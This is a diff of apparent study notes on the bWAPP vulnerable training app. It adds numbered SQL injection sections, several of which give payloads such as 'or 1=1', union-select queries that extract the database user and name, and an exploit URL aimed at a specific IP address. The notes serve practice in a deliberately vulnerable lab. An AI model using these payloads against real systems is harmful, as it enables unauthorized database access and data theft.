@@ -1,5 +1,7 @@
 
 	https://blog.csdn.net/xuandao_ahfengren/article/details/105890910
+	
+	https://blog.csdn.net/angry_program/category_9745022.html
 
 
 HTML Injection - Reflected (GET)
@@ -102,14 +104,60 @@ Server-Side Includes (SSI) Injection
 		
 	return htmlspecialchars($data, ENT_QUOTES, $encoding);
 
-SQL Injection (Search/GET)
-SQL Injection (Search/POST)
-SQL Injection (Search/CAPTCHA)
-SQL Injection (Select/GET)
-SQL Injection (Login Form)
-SQL Injection - Stored (Blog)
-SQL Injection - Blind (Search)
-XML/XPath Injection (Login Form)
+	
+0x01、SQL Injection (GET/Search)
+	return $data;
+		’or 1=1#
+		' union select 1,2,3,4,5,6,7 #
+		' union select 1,user(),database(),4,5,6,7 #
+	
+	return addslashes($data);
+	
+	return mysql_real_escape_string($data);
+	
+0x02、SQL Injection (GET/Select)
+	
+	$sql = "SELECT title, release_year, genre, main_character, imdb FROM movies WHERE id =?";
+		http://1.117.162.201/bwapp/bWAPP/sqli_2.php?movie=0+union+select+1,2,3,4,5,6,7#&action=go
+	
+0x03、SQL Injection (POST/Search)
+
+0x04、SQL Injection (POST/Select)
+
+0x05、SQL Injection (AJAX/JSON/jQuery)
+	t%'or 1=1 -- +
+	
+0x06、SQL Injection (Login Form/Hero)
+	123' or 1=1 -- +
+
+0x07、SQL Injection (Login Form/User)
+	
+0x08、SQL Injection (SQLite)
+	Iron%' and 1=1 --
+	123%' union select 1,2,3,4,5,6 --
+	
+0x09、Drupal SQL Injection (Drupageddon)
+
+0x0A、SQL Injection - Stored (Blog)
+	test', (select database())) #
+	
+0x0B、SQL Injection - Stored (SQLite)
+
+0x0C、SQL Injection - Stored (User-Agent)
+
+0x0D、SQL Injection - Stored (XML)
+
+0x0E、SQL Injection - Blind - Boolean-Based
+
+0x0F、SQL Injection - Blind - Time-Based
+
+0x10、SQL Injection - Blind (SQLite)
+
+0x11、SQL Injection - Blind (WS/SOAP)
+
+
+
+
 Broken Auth. - Forgotten Function
 Broken Auth. - Insecure Login Forms
 Broken Auth. - Logout Management
